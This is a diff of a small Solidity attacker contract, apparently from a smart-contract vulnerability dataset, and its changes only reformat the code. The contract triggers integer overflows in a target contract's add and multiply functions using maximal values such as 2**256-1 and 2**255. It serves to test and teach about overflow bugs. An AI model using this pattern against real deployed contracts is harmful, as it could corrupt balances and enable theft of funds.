@@ -5,17 +5,19 @@ import "../dataset/arithmetic/overflow_single_tx.sol";
 contract IntegerOverflowSingleTransactionAttacker {
     IntegerOverflowSingleTransaction public target;
 
-    function IntegerOverflowSingleTransactionAttacker(address _targetAddress) public {
+    function IntegerOverflowSingleTransactionAttacker(
+        address _targetAddress
+    ) public {
         target = IntegerOverflowSingleTransaction(_targetAddress);
     }
 
     function attackOverflowAddToState() public {
-        uint256 largeNumber = 2**256 - 1;
+        uint256 largeNumber = 2 ** 256 - 1;
         target.overflowaddtostate(largeNumber);
     }
 
     function attackOverflowMulToState() public {
-        uint256 largeNumber = 2**255;
+        uint256 largeNumber = 2 ** 255;
         target.overflowmultostate(largeNumber);
         target.overflowmultostate(2);
     }
